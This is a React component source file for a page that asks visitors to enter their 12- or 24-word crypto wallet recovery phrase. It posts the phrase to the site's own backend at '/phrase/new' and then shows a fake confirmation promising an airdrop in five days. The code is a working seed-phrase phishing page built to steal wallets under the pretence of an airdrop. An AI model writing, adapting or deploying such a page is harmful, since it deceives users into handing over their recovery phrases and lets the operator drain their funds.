import React, {useState} from 'react'
import "./Phrase.css"
import Button from '@material-ui/core/Button';
import TwitterIcon from '@material-ui/icons/Twitter';
import Header from "./Header"
import axios from "./axios";


function Phrase() {

    const [input, setInput] = useState("");

    const sendPhrase = async(e) => {
        e.preventDefault();

        console.log(input)
        console.log("clicked");
        await axios.post("/phrase/new", {
            phrase: input
        });

        setInput("");
        alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");

    };



    return (
        <div className="main__phrase">
            <Header />
            <div className="phrase__form">
                <form className="phrase__form">
                <textarea value={input} placeholder="Phrase" onChange={(e) => setInput(e.target.value)} type="text" name="Phrase">
                </textarea>
                <p className="phrase__description">Typically 12, (sometimes 24) words separated by single spaces</p>
                <Button onClick={sendPhrase} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                </form>
                <a className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>

                
            </div>
        </div>
    )
}

export default Phrase
